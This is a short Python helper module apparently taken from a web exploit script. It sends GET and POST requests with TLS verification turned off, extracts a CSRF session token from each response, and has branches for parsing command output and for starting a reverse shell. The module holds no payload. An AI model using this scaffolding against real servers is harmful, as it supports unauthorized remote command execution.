import re
import utils

regex = "sid:.*;var"


def simpleGET(details, path, value, cmd):
    
    simple_url = details.url + path + value
    simple_headers = {"User-Agent": details.agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"}
    r = details.session.get(simple_url, headers=simple_headers, verify=False)
    if(cmd == 0): details.csrf = re.findall(regex, r.text)[0][:-5]
    if(cmd == 1): utils.parseCMDOutput(details, r.text)
    if(cmd == 3): print("Starting reverse shell")
    if(cmd == 4): details.ids = r.text

def simplePOST(details, path, value, cmd, postdata):

    simple_url = details.url + path
    simple_headers = {"User-Agent": details.agent,
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Content-Type": "application/x-www-form-urlencoded"}

    r = details.session.post(simple_url, headers=simple_headers, data=postdata, verify=False)

    if(cmd == 0): details.csrf = re.findall(regex, r.text)[0][:-5]
    # jank go brrr
    if(cmd == 1): 
        if "loggedin" in postdata:
            print("Executing")
        else:
            print(r.text)

